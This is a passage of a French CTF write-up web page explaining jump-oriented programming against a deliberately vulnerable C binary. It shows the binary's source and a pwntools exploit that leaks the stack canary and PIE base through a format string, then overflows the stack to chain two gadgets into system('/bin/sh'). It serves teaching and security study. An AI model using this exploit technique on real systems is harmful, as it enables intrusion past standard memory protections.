+            Appliquons maintenant la théorie sur un binaire construit pour mettre en pratique le JOP dans sa forme la plus directe. Toutes les protections modernes sont activées simultanément, le binaire expose deux vulnérabilités intentionnelles, et deux gadgets JOP ont été écrits à la main en assemblage pur pour illustrer le mécanisme.
+        </p>
+
+<div class="bg-black border border-black p-8 my-10 grid md:grid-cols-2 gap-6">
+    <div>
+        <div class="mono text-[10px] font-black text-gray-500 uppercase tracking-widest mb-3" data-i18n="art_prot_title">Protections actives</div>
+        <ul class="!text-sm !mb-0 space-y-1">
+            <li class="text-gray-300"><code class="bg-gray-800 text-white border-gray-700">-fPIE -pie</code> → ASLR + PIE</li>
+            <li class="text-gray-300"><code class="bg-gray-800 text-white border-gray-700">-fstack-protector-strong</code> → Canary SSP</li>
+            <li class="text-gray-300"><code class="bg-gray-800 text-white border-gray-700">-z noexecstack</code> → NX</li>
+            <li class="text-gray-300"><code class="bg-gray-800 text-white border-gray-700">-Wl,-z,relro,-z,now</code> → Full RELRO</li>
+        </ul>
+    </div>
+    <div>
+        <div class="mono text-[10px] font-black text-gray-500 uppercase tracking-widest mb-3" data-i18n="art_obj_title">Objectif</div>
+        <ul class="!text-sm !mb-0 space-y-1">
+            <li class="text-gray-300" data-i18n="art_obj_1">Obtenir <code class="bg-gray-800 text-white border-gray-700">system("/bin/sh")</code></li>
+            <li class="text-gray-300" data-i18n="art_obj_2">Sans écrire un seul octet de shellcode</li>
+            <li class="text-gray-300" data-i18n="art_obj_3">En enchaînant deux gadgets <code class="bg-gray-800 text-white border-gray-700">jmp</code></li>
+        </ul>
+    </div>
+</div>
+
+        <h3 data-i18n="art_h3_7_2">Les deux vulnérabilités du binaire</h3>
+        <p data-i18n="art_p21">
+            La fonction <code>main()</code> appelle séquentiellement deux fonctions vulnérables, nous offrant un pipeline exploit en deux temps : d'abord le leak, ensuite l'overflow.
+        </p>
+
+<div class="border border-gray-700 mb-12 rounded-sm overflow-hidden">
+    <div class="bg-gray-950 px-4 py-3 border-b border-gray-700 flex justify-between items-center">
+        <div class="flex items-center gap-3">
+            <div class="flex gap-1.5">
+                <span class="w-2.5 h-2.5 rounded-full bg-red-500"></span>
+                <span class="w-2.5 h-2.5 rounded-full bg-yellow-500"></span>
+                <span class="w-2.5 h-2.5 rounded-full bg-green-500"></span>
+            </div>
+            <span class="w-px h-4 bg-gray-700"></span>
+            <i class="fas fa-file-code text-gray-500 text-xs"></i>
+            <span class="mono text-[10px] font-bold text-gray-400 tracking-widest">vuln.c</span>
+            <span class="mono text-[9px] text-gray-600 tracking-widest">- source complet</span>
+        </div>
+        <button onclick="copyToClipboard('code-vuln', this)"
+            class="mono text-[10px] font-bold text-gray-500 hover:text-white transition-colors flex items-center gap-1.5" data-i18n="btn_copy">
+            <i class="far fa-copy"></i> COPIER
+        </button>
+    </div>
+    <pre class="bg-gray-950 text-gray-300 p-6 overflow-x-auto text-[12px] leading-relaxed mono no-scrollbar" id="code-vuln">
+<span class="text-gray-600">/* gcc vuln.c -o vuln \</span>
+<span class="text-gray-600">     -fPIE -pie \</span>
+<span class="text-gray-600">     -fstack-protector-strong \</span>
+<span class="text-gray-600">     -O2 \</span>
+<span class="text-gray-600">     -Wl,-z,relro,-z,now \</span>
+<span class="text-gray-600">     -z noexecstack \</span>
+<span class="text-gray-600">     -fno-omit-frame-pointer */</span>
+
+<span class="text-blue-400">#include</span> <span class="text-green-400">&lt;stdio.h&gt;</span>
+<span class="text-blue-400">#include</span> <span class="text-green-400">&lt;unistd.h&gt;</span>
+<span class="text-blue-400">#include</span> <span class="text-green-400">&lt;stdlib.h&gt;</span>
+
+<span class="text-gray-600">/* chaîne "/bin/sh" ancrée en .rodata - utilisée comme argument */</span>
+<span class="text-blue-400">__attribute__</span>((used))
+<span class="text-blue-400">static const char</span> <span class="text-white font-bold">hidden</span>[] = <span class="text-green-400">"/bin/sh"</span>;
+
+<span class="text-gray-600">/* ── Gadget JOP 1 - chargeur de pivot ───────────────────────── */</span>
+<span class="text-blue-400">__attribute__</span>((naked, noinline))
+<span class="text-blue-400">void</span> <span class="text-white font-bold">g1</span>() {
+    <span class="text-blue-400">__asm__</span> <span class="text-blue-400">volatile</span>(
+        <span class="text-green-400">"pop %r12;\n"</span>    <span class="text-gray-600">// r12 ← [RSP]  ;  RSP += 8</span>
+        <span class="text-green-400">"jmp *%r12;\n"</span>   <span class="text-gray-600">// saute vers l'adresse dans r12</span>
+    );
+}
+
+<span class="text-gray-600">/* ── Gadget JOP 2 - setter d'argument ───────────────────────── */</span>
+<span class="text-blue-400">__attribute__</span>((naked, noinline))
+<span class="text-blue-400">void</span> <span class="text-white font-bold">g2</span>() {
+    <span class="text-blue-400">__asm__</span> <span class="text-blue-400">volatile</span>(
+        <span class="text-green-400">"pop %rdi;\n"</span>    <span class="text-gray-600">// rdi ← [RSP]  ;  1er arg ABI System V</span>
+        <span class="text-green-400">"jmp *%r12;\n"</span>   <span class="text-gray-600">// jmp r12 = jmp system → system(rdi)</span>
+    );
+}
+
+<span class="text-gray-600">/* ── Vulnérabilité 1 - Format String ────────────────────────── */</span>
+<span class="text-blue-400">__attribute__</span>((noinline))
+<span class="text-blue-400">void</span> <span class="text-white font-bold">leak</span>() {
+    <span class="text-blue-400">char</span> fmt[<span class="text-purple-400">64</span>];
+    <span class="text-yellow-400">read</span>(<span class="text-purple-400">0</span>, fmt, <span class="text-blue-400">sizeof</span>(fmt));
+    <span class="text-yellow-400">printf</span>(fmt);  <span class="text-red-400 font-bold">// ← format string : DANGEREUX</span>
+}
+
+<span class="text-gray-600">/* ── Vulnérabilité 2 - Stack Buffer Overflow ────────────────── */</span>
+<span class="text-blue-400">__attribute__</span>((noinline))
+<span class="text-blue-400">void</span> <span class="text-white font-bold">vuln</span>() {
+    <span class="text-blue-400">char</span> buf[<span class="text-purple-400">64</span>];
+    <span class="text-yellow-400">read</span>(<span class="text-purple-400">0</span>, buf, <span class="text-purple-400">300</span>);  <span class="text-red-400 font-bold">// ← 300 octets dans 64 : OVERFLOW</span>
+}
+
+<span class="text-blue-400">int</span> <span class="text-white font-bold">main</span>() {
+    <span class="text-yellow-400">setbuf</span>(stdout, <span class="text-purple-400">NULL</span>);
+    <span class="text-yellow-400">setbuf</span>(stdin,  <span class="text-purple-400">NULL</span>);
+    <span class="text-yellow-400">leak</span>();   <span class="text-gray-600">// stage 1 : info leak</span>
+    <span class="text-yellow-400">vuln</span>();   <span class="text-gray-600">// stage 2 : exploit</span>
+    <span class="text-blue-400">return</span> <span class="text-purple-400">0</span>;
+}
+
+<span class="text-gray-600">/* ── Constructeur - résout system() avant main() ────────────── */</span>
+<span class="text-blue-400">__attribute__</span>((constructor))
+<span class="text-blue-400">void</span> <span class="text-white font-bold">__ctx</span>() {
+    <span class="text-yellow-400">system</span>(<span class="text-green-400">"/bin/true"</span>);  <span class="text-gray-600">// force la résolution de system dans la GOT</span>
+}</pre>
+</div>
+
+        <h3 data-i18n="art_h3_7_3">L'astuce du constructeur: résoudre system() avant main()</h3>
+        <p data-i18n="art_p22">
+            Le binaire contient un constructeur (<code>__attribute__((constructor))</code>) qui s'exécute automatiquement <em>avant</em> <code>main()</code>, avant même que le programme ne soit visible pour l'utilisateur. Ce constructeur appelle <code>system("/bin/true")</code>, une commande inoffensive mais son effet de bord est décisif : il force la résolution de <code>system</code> dans la PLT/GOT dès le démarrage. Même avec Full RELRO, l'adresse réelle de <code>system</code> est ainsi accessible via <code>elf.sym["system"]</code> dès le début de l'exploitation.
+        </p>
+
+
+        <h3 data-i18n="art_h3_7_4">Les gadgets JOP du binaire</h3>
+        <p data-i18n="art_p23">
+            Deux fonctions <code>naked</code> sont définies en assemblage pur dans le binaire sans prologue ni épilogue générés par le compilateur. Chaque instruction écrite est exactement ce qui s'exécute. Ces deux gadgets forment la totalité de la chaîne JOP.
+        </p>
+
+<div class="border border-gray-700 mb-12 rounded-sm overflow-hidden">
+    <div class="bg-gray-950 px-4 py-3 border-b border-gray-700 flex justify-between items-center">
+        <div class="flex items-center gap-3">
+            <div class="flex gap-1.5">
+                <span class="w-2.5 h-2.5 rounded-full bg-red-500"></span>
+                <span class="w-2.5 h-2.5 rounded-full bg-yellow-500"></span>
+                <span class="w-2.5 h-2.5 rounded-full bg-green-500"></span>
+            </div>
+            <span class="w-px h-4 bg-gray-700"></span>
+            <i class="fas fa-file-code text-gray-500 text-xs"></i>
+            <span class="mono text-[10px] font-bold text-gray-400 tracking-widest">vuln.c</span>
+            <span class="mono text-[9px] text-gray-600 tracking-widest">- gadgets JOP</span>
+        </div>
+        <button onclick="copyToClipboard('code-gadgets', this)"
+            class="mono text-[10px] font-bold text-gray-500 hover:text-white transition-colors flex items-center gap-1.5" data-i18n="btn_copy">
+            <i class="far fa-copy"></i> COPIER
+        </button>
+    </div>
+    <pre class="bg-gray-950 text-gray-300 p-6 overflow-x-auto text-[12px] leading-relaxed mono no-scrollbar" id="code-gadgets">
+<span class="text-gray-600">// g1 - Gadget chargeur : initialise le registre pivot r12</span>
+<span class="text-blue-400">__attribute__</span>((naked, noinline))
+<span class="text-blue-400">void</span> <span class="text-white font-bold">g1</span>() {
+    <span class="text-blue-400">__asm__</span> <span class="text-blue-400">volatile</span>(
+        <span class="text-green-400">"pop %r12;\n"</span>   <span class="text-gray-600">// r12 ← [RSP], RSP += 8</span>
+        <span class="text-green-400">"jmp *%r12;\n"</span>  <span class="text-gray-600">// saute vers l'adresse dans r12</span>
+    );
+}
+
+<span class="text-gray-600">// g2 - Gadget argument : charge rdi et appelle via r12</span>
+<span class="text-blue-400">__attribute__</span>((naked, noinline))
+<span class="text-blue-400">void</span> <span class="text-white font-bold">g2</span>() {
+    <span class="text-blue-400">__asm__</span> <span class="text-blue-400">volatile</span>(
+        <span class="text-green-400">"pop %rdi;\n"</span>   <span class="text-gray-600">// rdi ← [RSP] = &"/bin/sh" (1er arg ABI)</span>
+        <span class="text-green-400">"jmp *%r12;\n"</span>  <span class="text-gray-600">// jmp r12 = jmp system → system(rdi)</span>
+    );
+}</pre>
+</div>
+
+        <p data-i18n="art_p24">
+            <strong>g1</strong> est le gadget chargeur : il pique la prochaine valeur sur la pile avec <code>pop r12</code>, y place l'adresse de <code>system</code>, puis y saute immédiatement avec <code>jmp *r12</code>. Il joue le rôle d'initiateur de la chaîne.
+        </p>
+        <p data-i18n="art_p25">
+            <strong>g2</strong> est le gadget argument : il charge <code>rdi</code>, qui est le premier argument dans la convention d'appel System V AMD64 avec l'adresse de la chaîne <code>/bin/sh</code>, puis saute vers <code>r12</code> qui contient toujours l'adresse de <code>system</code>. L'appel effectif est donc <code>system("/bin/sh")</code>. <code>r12</code> est callee-saved : il a conservé sa valeur à travers tous les gadgets précédents.
+        </p>
+
+        <h3 data-i18n="art_h3_7_5">Stage 1 : Info leak via format string</h3>
+        <p data-i18n="art_p26">
+            La format string vulnerability dans <code>leak()</code> nous permet de lire des valeurs arbitraires sur la pile en utilisant des spécificateurs de position comme <code>%15$p</code>. En envoyant la bonne chaîne de format, on extrait deux éléments essentiels : le canary SSP et une adresse dans le segment de code du binaire qui nous permettra de calculer la base PIE.
+        </p>
+
+<div class="border border-gray-700 mb-12 rounded-sm overflow-hidden">
+    <div class="bg-gray-950 px-4 py-3 border-b border-gray-700 flex justify-between items-center">
+        <div class="flex items-center gap-3">
+            <div class="flex gap-1.5">
+                <span class="w-2.5 h-2.5 rounded-full bg-red-500"></span>
+                <span class="w-2.5 h-2.5 rounded-full bg-yellow-500"></span>
+                <span class="w-2.5 h-2.5 rounded-full bg-green-500"></span>
+            </div>
+            <span class="w-px h-4 bg-gray-700"></span>
+            <i class="fas fa-file-code text-gray-500 text-xs"></i>
+            <span class="mono text-[10px] font-bold text-gray-400 tracking-widest">exploit.py</span>
+            <span class="mono text-[9px] text-gray-600 tracking-widest">- stage 1 : leak</span>
+        </div>
+        <button onclick="copyToClipboard('code-leak', this)"
+            class="mono text-[10px] font-bold text-gray-500 hover:text-white transition-colors flex items-center gap-1.5" data-i18n="btn_copy">
+            <i class="far fa-copy"></i> COPIER
+        </button>
+    </div>
+    <pre class="bg-gray-950 text-gray-300 p-6 overflow-x-auto text-[12px] leading-relaxed mono no-scrollbar" id="code-leak">
+<span class="text-gray-600"># Envoi de la format string pour lire deux positions sur la pile</span>
+fmt = <span class="text-green-400">b"%15$p|%23$p"</span>
+<span class="text-gray-600"># %15$p → position 15 depuis printf → le canary SSP</span>
+<span class="text-gray-600"># %23$p → position 23 → adresse de retour dans main (contient l'offset PIE)</span>
+
+sh.<span class="text-yellow-400">sendline</span>(fmt)
+
+leaks    = sh.<span class="text-yellow-400">recvline</span>().<span class="text-yellow-400">strip</span>().<span class="text-yellow-400">split</span>(<span class="text-green-400">b"|"</span>)
+canary   = <span class="text-yellow-400">int</span>(leaks[<span class="text-purple-400">0</span>], <span class="text-purple-400">16</span>)
+pie_leak = <span class="text-yellow-400">int</span>(leaks[<span class="text-purple-400">1</span>], <span class="text-purple-400">16</span>)
+
+<span class="text-gray-600"># Calcul de la base PIE : leak - offset_statique_de_main</span>
+elf.address = pie_leak - elf.sym[<span class="text-green-400">"main"</span>]
+
+<span class="text-gray-600"># Toutes les adresses sont maintenant calculables</span>
+g1     = elf.address + <span class="text-purple-400">0x11c0</span>   <span class="text-gray-600"># offset statique de g1 dans le binaire</span>
+g2     = elf.address + <span class="text-purple-400">0x11d0</span>   <span class="text-gray-600"># offset statique de g2</span>
+binsh  = elf.address + <span class="text-purple-400">0x2010</span>   <span class="text-gray-600"># chaîne "/bin/sh" dans .rodata</span>
+system = elf.sym[<span class="text-green-400">"system"</span>]      <span class="text-gray-600"># résolu par __ctx au démarrage</span></pre>
+</div>
+
+        <h3 data-i18n="art_h3_7_6">Stage 2 : Construction du payload JOP</h3>
+        <p data-i18n="art_p27">
+            Le buffer overflow dans <code>vuln()</code> nous permet d'écraser la pile au-delà du buffer de 64 octets. Le layout mémoire de la frame est le suivant, on doit atteindre l'adresse de retour en préservant le canary intact :
+        </p>
+
+<div class="border border-gray-700 mb-12 rounded-sm overflow-hidden">
+    <div class="bg-gray-950 px-4 py-3 border-b border-gray-700 flex items-center gap-3">
+        <div class="flex gap-1.5">
+            <span class="w-2.5 h-2.5 rounded-full bg-red-500"></span>
+            <span class="w-2.5 h-2.5 rounded-full bg-yellow-500"></span>
+            <span class="w-2.5 h-2.5 rounded-full bg-green-500"></span>
+        </div>
+        <span class="w-px h-4 bg-gray-700"></span>
+        <i class="fas fa-layer-group text-gray-500 text-xs"></i>
+        <span class="mono text-[10px] font-bold text-gray-400 tracking-widest">Memory_Layout // Stack Frame - vuln()</span>
+    </div>
+    <div class="bg-gray-950 p-6 font-mono text-sm space-y-2">
+
+        <div class="flex gap-4 border-b border-gray-800 pb-2">
+            <div class="w-16 text-gray-600 text-xs mt-0.5">+0x00</div>
+            <div class="flex-1 bg-gray-800/50 px-3 py-1 text-gray-500" data-i18n="art_mem_1">Padding ('A' × 72) - buf[64] + 8 align</div>
+        </div>
+
+        <div class="flex gap-4 border-b border-gray-800 pb-2">
+            <div class="w-16 text-gray-600 text-xs mt-0.5">+0x48</div>
+            <div class="flex-1 bg-white text-black px-3 py-1 font-bold flex justify-between">
+                <span data-i18n="art_mem_2">CANARY (valeur leakée exacte)</span>
+                <span class="text-gray-400 text-xs font-normal" data-i18n="art_mem_3">bypass SSP</span>
+            </div>
+        </div>
+
+        <div class="flex gap-4 border-b border-gray-800 pb-2">
+            <div class="w-16 text-gray-600 text-xs mt-0.5">+0x50</div>
+            <div class="flex-1 bg-gray-800/50 px-3 py-1 text-gray-500" data-i18n="art_mem_4">Saved RBP ('B' × 8) - valeur arbitraire</div>
+        </div>
+
+        <div class="flex gap-4 border-b border-gray-800 pb-2">
+            <div class="w-16 text-gray-600 text-xs mt-0.5">+0x58</div>
+            <div class="flex-1 border border-white px-3 py-1 font-bold text-white flex justify-between">
+                <span>addr(g1)</span>
+                <span class="text-gray-500 text-xs font-normal" data-i18n="art_mem_5">← ret saute ici → entre dans g1</span>
+            </div>
+        </div>
+
+        <div class="flex gap-4 border-b border-gray-800 pb-2">
+            <div class="w-16 text-gray-600 text-xs mt-0.5">+0x60</div>
+            <div class="flex-1 border border-gray-600 px-3 py-1 text-gray-300 flex justify-between">
+                <span>addr(system)</span>
+                <span class="text-gray-500 text-xs" data-i18n="art_mem_6">← g1 : pop r12 = system</span>
+            </div>
+        </div>
+
+        <div class="flex gap-4 border-b border-gray-800 pb-2">
+            <div class="w-16 text-gray-600 text-xs mt-0.5">+0x68</div>
+            <div class="flex-1 border border-gray-600 px-3 py-1 text-gray-300 flex justify-between">
+                <span>addr(g2)</span>
+                <span class="text-gray-500 text-xs" data-i18n="art_mem_7">← sur la pile quand system reprend</span>
+            </div>
+        </div>
+
+        <div class="flex gap-4 pb-2">
+            <div class="w-16 text-gray-600 text-xs mt-0.5">+0x70</div>
+            <div class="flex-1 border border-gray-600 px-3 py-1 text-gray-300 flex justify-between">
+                <span>addr(binsh)</span>
+                <span class="text-gray-500 text-xs" data-i18n="art_mem_8">← g2 : pop rdi = &"/bin/sh"</span>
+            </div>
+        </div>
+
+    </div>
+</div>
+
+        <p data-i18n="art_p28">Le script d'exploitation complet (pwntools) ressemble à ceci :</p>
+
+<div class="border border-gray-700 mb-12 rounded-sm overflow-hidden">
+    <div class="bg-gray-950 px-4 py-3 border-b border-gray-700 flex justify-between items-center">
+        <div class="flex items-center gap-3">
+            <div class="flex gap-1.5">
+                <span class="w-2.5 h-2.5 rounded-full bg-red-500"></span>
+                <span class="w-2.5 h-2.5 rounded-full bg-yellow-500"></span>
+                <span class="w-2.5 h-2.5 rounded-full bg-green-500"></span>
+            </div>
+            <span class="w-px h-4 bg-gray-700"></span>
+            <i class="fas fa-file-code text-gray-500 text-xs"></i>
+            <span class="mono text-[10px] font-bold text-gray-400 tracking-widest">exploit.py</span>
+            <span class="mono text-[9px] text-gray-600 tracking-widest">- payload final</span>
+        </div>
+        <button onclick="copyToClipboard('code-py', this)"
+            class="mono text-[10px] font-bold text-gray-500 hover:text-white transition-colors flex items-center gap-1.5" data-i18n="btn_copy">
+            <i class="far fa-copy"></i> COPIER
+        </button>
+    </div>
+    <pre class="bg-gray-950 text-gray-300 p-6 overflow-x-auto text-[12px] leading-relaxed mono no-scrollbar" id="code-py">
+<span class="text-gray-600"># ── Construction du payload ────────────────────────────</span>
+payload  = <span class="text-green-400">b"A"</span> * (<span class="text-purple-400">64</span>+<span class="text-purple-400">8</span>)    <span class="text-gray-600"># padding : buf[64] + 8 octets d'alignement</span>
+payload += <span class="text-yellow-400">p64</span>(canary)         <span class="text-gray-600"># canary intact → bypass SSP</span>
+payload += <span class="text-green-400">b"B"</span> * <span class="text-purple-400">8</span>            <span class="text-gray-600"># faux RBP sauvegardé</span>
+
+<span class="text-gray-600"># ── Chaîne JOP ─────────────────────────────────────────</span>
+payload += <span class="text-yellow-400">p64</span>(g1)             <span class="text-gray-600"># adresse de retour → ret saute dans g1</span>
+payload += <span class="text-yellow-400">p64</span>(system)         <span class="text-gray-600"># g1 : pop r12 ← addr(system)</span>
+                               <span class="text-gray-600"># g1 : jmp *r12 → entre dans system</span>
+payload += <span class="text-yellow-400">p64</span>(g2)             <span class="text-gray-600"># RSP pointe ici quand system reprend la pile</span>
+payload += <span class="text-yellow-400">p64</span>(binsh)          <span class="text-gray-600"># g2 : pop rdi ← addr("/bin/sh")</span>
+                               <span class="text-gray-600"># g2 : jmp *r12 → r12 = system encore</span>
+                               <span class="text-gray-600"># → system("/bin/sh") !</span>
+
+sh.<span class="text-yellow-400">sendline</span>(payload)
+sh.<span class="text-yellow-400">interactive</span>()</pre>
+</div>
+
+        <h3 data-i18n="art_h3_7_7">Trace d'exécution de la chaîne</h3>
+        <p data-i18n="art_p29">
+            Voici ce qui se passe exactement lors de l'exécution du payload, instruction par instruction :
+        </p>
+
+        <ul class="space-y-4">
+            <li data-i18n="art_trace_1">
+                <strong>ret dans vuln() :</strong> RSP pointe sur <code>addr(g1)</code>. Le CPU charge cette adresse et y saute. On entre dans g1.
+            </li>
+            <li data-i18n="art_trace_2">
+                <strong>g1 : pop r12 :</strong> la valeur au sommet de la pile (<code>addr(system)</code>, +0x60) est chargée dans <code>r12</code>. RSP avance à +0x68.
+            </li>
+            <li data-i18n="art_trace_3">
+                <strong>g1 : jmp *r12 :</strong> le CPU saute vers <code>system</code>. RSP pointe sur +0x68 (<code>addr(g2)</code>). La pile est dans cet état lorsque <code>system</code> commence à s'exécuter.
+            </li>
+            <li data-i18n="art_trace_4">
+                <strong>system reprend le contrôle de la pile :</strong> lors de son exécution interne, <code>system</code> consomme RSP et finit par retransférer le contrôle vers ce que la pile indique. Ici <code>addr(g2)</code>. On entre dans g2.
+            </li>
+            <li data-i18n="art_trace_5">
+                <strong>g2 : pop rdi :</strong> l'adresse de <code>"/bin/sh"</code> est chargée dans <code>rdi</code>, le premier argument selon l'ABI System V.
+            </li>
+            <li data-i18n="art_trace_6">
+                <strong>g2 : jmp *r12 :</strong> <code>r12</code> est callee-saved et contient toujours <code>addr(system)</code>. L'appel effectif est <code>system("/bin/sh")</code>. Le shell est obtenu.
+            </li>
+        </ul>
+
+<div class="border border-gray-700 my-12 rounded-sm overflow-hidden">
+    <div class="bg-gray-950 px-4 py-3 border-b border-gray-700 flex items-center gap-3">
+        <div class="flex gap-1.5">
+            <span class="w-2.5 h-2.5 rounded-full bg-red-500"></span>
+            <span class="w-2.5 h-2.5 rounded-full bg-yellow-500"></span>
+            <span class="w-2.5 h-2.5 rounded-full bg-green-500"></span>
+        </div>
+        <span class="w-px h-4 bg-gray-700"></span>
+        <i class="fas fa-shield-halved text-gray-500 text-xs"></i>
+        <span class="mono text-[10px] font-bold text-gray-400 tracking-widest" data-i18n="art_bypass_title">// BILAN PROTECTIONS CONTOURNÉES</span>
+    </div>
+
+    <div class="bg-gray-950 p-6 space-y-2">
+
+        <div class="flex items-center gap-3 border border-green-500/20 bg-green-500/5 px-4 py-2.5 rounded-sm">
+            <span class="text-green-400 font-bold mono text-[10px] flex-shrink-0">[BYPASS]</span>
+            <span class="w-px h-4 bg-gray-700 flex-shrink-0"></span>
+            <span class="text-white font-bold text-[12px] flex-shrink-0 w-28">NX</span>
+            <span class="text-gray-400 text-[12px]" data-i18n="art_bypass_nx">aucun shellcode, uniquement du code existant dans <code class="text-gray-300 text-[11px]">.text</code></span>
+        </div>
+
+        <div class="flex items-center gap-3 border border-green-500/20 bg-green-500/5 px-4 py-2.5 rounded-sm">
+            <span class="text-green-400 font-bold mono text-[10px] flex-shrink-0">[BYPASS]</span>
+            <span class="w-px h-4 bg-gray-700 flex-shrink-0"></span>
+            <span class="text-white font-bold text-[12px] flex-shrink-0 w-28">PIE + ASLR</span>
+            <span class="text-gray-400 text-[12px]" data-i18n="art_bypass_pie">base calculée grâce au leak format string</span>
+        </div>
+
+        <div class="flex items-center gap-3 border border-green-500/20 bg-green-500/5 px-4 py-2.5 rounded-sm">
+            <span class="text-green-400 font-bold mono text-[10px] flex-shrink-0">[BYPASS]</span>
+            <span class="w-px h-4 bg-gray-700 flex-shrink-0"></span>
+            <span class="text-white font-bold text-[12px] flex-shrink-0 w-28">Stack Canary</span>
+            <span class="text-gray-400 text-[12px]" data-i18n="art_bypass_ssp">valeur leakée et réécrite identique</span>
+        </div>
+
+        <div class="flex items-center gap-3 border border-green-500/20 bg-green-500/5 px-4 py-2.5 rounded-sm">
+            <span class="text-green-400 font-bold mono text-[10px] flex-shrink-0">[BYPASS]</span>
+            <span class="w-px h-4 bg-gray-700 flex-shrink-0"></span>
+            <span class="text-white font-bold text-[12px] flex-shrink-0 w-28">Full RELRO</span>
+            <span class="text-gray-400 text-[12px]" data-i18n="art_bypass_relro">GOT jamais touchée, appel direct via adresse leakée</span>
+        </div>
+
+        <div class="flex items-center gap-3 border border-green-500/20 bg-green-500/5 px-4 py-2.5 rounded-sm">
+            <span class="text-green-400 font-bold mono text-[10px] flex-shrink-0">[BYPASS]</span>
+            <span class="w-px h-4 bg-gray-700 flex-shrink-0"></span>
+            <span class="text-white font-bold text-[12px] flex-shrink-0 w-28">Shadow Stack</span>
+            <span class="text-gray-400 text-[12px]" data-i18n="art_bypass_shadow">aucun <code class="text-gray-300 text-[11px]">ret</code> dans la chaîne JOP, mécanisme invisible</span>
+        </div>
+
+    </div>
+
+</div>
+
+        <h2 data-i18n="art_h2_8">08 - Références</h2>
+
+<ul class="space-y-3">
+    <li>Tyler Bletsch et al., <em>"Jump-Oriented Programming: A New Class of Code-Reuse Attack"</em>, ASIACCS 2011</li>
+    <li>Hovav Shacham, <em>"The Geometry of Innocent Flesh on the Bone: Return-into-libc without Function Calls (on the x86)"</em>, CCS 2007</li>
+    <li>Intel, <em>"A Technical Look at Intel's Control-flow Enforcement Technology"</em>, 2020</li>
+    <li>System V Application Binary Interface, AMD64 Architecture Processor Supplement, v1.0</li>
+    <li>pwntools documentation <code>elf.sym</code>, <code>p64</code>, <code>process/remote</code> <a href="https://docs.pwntools.com" target="_blank" class="underline underline-offset-4 decoration-1 hover:text-black transition-colors">docs.pwntools.com</a></li>
+    <li>
+        BUG|PWN " NICC 2026 CTF Finals, challenge <code>pmj</code> "
+        <a href="https://github.com/0xbugpwn/NICC-2026-CTF/tree/main/Finals/pmj" target="_blank" class="underline underline-offset-4 decoration-1 hover:text-black transition-colors flex items-center gap-1.5 inline-flex mt-1">
+            <i class="fab fa-github text-xs"></i> github.com/0xbugpwn/NICC-2026-CTF
+        </a>
+    </li>
+</ul>
+
+    </main>
+
+    <section class="py-24 bg-black text-white border-t border-black">
+        <div class="max-w-4xl mx-auto px-6 text-center">
+            <h2 class="text-3xl font-black uppercase tracking-tighter mb-6" data-i18n="news_title">Recevoir nos recherches (0-Spam)</h2>
+            <p class="text-gray-400 font-light mb-10 text-sm" data-i18n="news_desc">
+                Inscrivez-vous à notre flux de transmission sécurisé. Uniquement des writeups techniques, des annonces de CTF et des rapports d'audit publics.
+            </p>
+            <form class="flex flex-col md:flex-row gap-4 justify-center" id="newsletter-form">
+                <input type="email" id="news-input" required placeholder="email@domain.com" class="bg-transparent border border-gray-600 px-6 py-3 text-sm focus:outline-none focus:border-white w-full md:w-96 font-mono text-center md:text-left">
+                <button type="submit" id="news-btn" class="bg-white text-black px-8 py-3 text-[11px] font-black uppercase tracking-widest hover:bg-gray-200 transition-all" data-i18n="news_btn">
+                    S'abonner_
+                </button>
+            </form>
+        </div>
+    </section>
+
+    <footer class="bg-gray-100 py-16 border-t border-gray-300">
+        <div class="max-w-7xl mx-auto px-6 grid grid-cols-1 md:grid-cols-4 gap-12">
+            <div class="space-y-6">
+                <div class="text-xl font-black tracking-tighter mb-4">BUG|PWN</div>
+                <p class="text-[11px] leading-relaxed text-gray-500 uppercase tracking-wider max-w-xs font-medium" data-i18n="footer_bio">
+                    Unité de recherche en vulnérabilités avancées et audit de systèmes critiques.
+                </p>
+                <div class="flex gap-4">
+                    <a href="https://x.com/bug_pwn" target="_blank" class="w-8 h-8 bg-black text-white rounded-full flex items-center justify-center hover:bg-gray-700"><i class="fab fa-x-twitter"></i></a>
+                    <a href="https://github.com/0xbugpwn" target="_blank" class="w-8 h-8 bg-black text-white rounded-full flex items-center justify-center hover:bg-gray-700"><i class="fab fa-github"></i></a>
+                    <a href="https://www.linkedin.com/company/0xbugpwn" target="_blank" class="w-8 h-8 bg-black text-white rounded-full flex items-center justify-center hover:bg-gray-700"><i class="fab fa-linkedin"></i></a>
+                    <a href="https://www.youtube.com/@bug_pwn" target="_blank" class="w-8 h-8 bg-black text-white rounded-full flex items-center justify-center hover:bg-gray-700"><i class="fab fa-youtube"></i></a>
+                </div>
+            </div>
+            <div>
+                <h5 class="text-[10px] font-black text-gray-400 uppercase tracking-[0.3em] mb-10">Capabilities_Index</h5>
+                <ul class="space-y-4 text-[11px] font-bold uppercase tracking-widest text-black">
+                    <li><a href="#" class="hover:underline underline-offset-8 decoration-1 transition-all">Reverse Engineering</a></li>
+                    <li><a href="#" class="hover:underline underline-offset-8 decoration-1 transition-all">Exploit Development</a></li>
+                    <li><a href="#" class="hover:underline underline-offset-8 decoration-1 transition-all" data-i18n="f_link_audit">Audit de Code Source</a></li>
+                    <li><a href="#" class="hover:underline underline-offset-8 decoration-1 transition-all" data-i18n="f_link_ics">Systèmes Industriels</a></li>
+                </ul>
+            </div>
+            <div>
+                <h5 class="text-[10px] font-black text-gray-400 uppercase tracking-[0.3em] mb-10">Knowledge_Base</h5>
+                <ul class="space-y-4 text-[11px] font-bold uppercase tracking-widest text-black">
+                    <li><a href="#" class="hover:underline underline-offset-8 decoration-1 transition-all">Repository Writeups</a></li>
+                    <li><a href="#" class="hover:underline underline-offset-8 decoration-1 transition-all">Whitepapers</a></li>
+                    <li><a href="#" class="hover:underline underline-offset-8 decoration-1 transition-all" data-i18n="f_link_tools">Outils Open Source</a></li>
+                    <li><a href="https://bugpwn.com/battlectf/archive/" target="_blank" class="hover:underline underline-offset-8 decoration-1 transition-all">CTF Archives</a></li>
+                </ul>
+            </div>
+            <div class="space-y-6">
+                <h5 class="text-[10px] font-black text-gray-400 uppercase tracking-[0.3em] mb-10">Secure_Channel</h5>
+                <p class="text-[10px] text-gray-400 uppercase tracking-widest font-medium italic" data-i18n="footer_pgp">
+                    Pour toute communication sensible, privilégiez le chiffrement PGP.
+                </p>
+                <a href="../contact.html#pgp-section" class="inline-block border border-black px-3 py-1 text-xs font-mono font-bold hover:bg-black hover:text-white transition">
+                    <i class="fas fa-key mr-2"></i> 0x0E42807D
+                </a>
+                <p class="text-xs text-gray-400 mt-4">© 2026 BUG|PWN RESEARCH UNIT. <br>ALL RIGHTS RESERVED.</p>
+            </div>
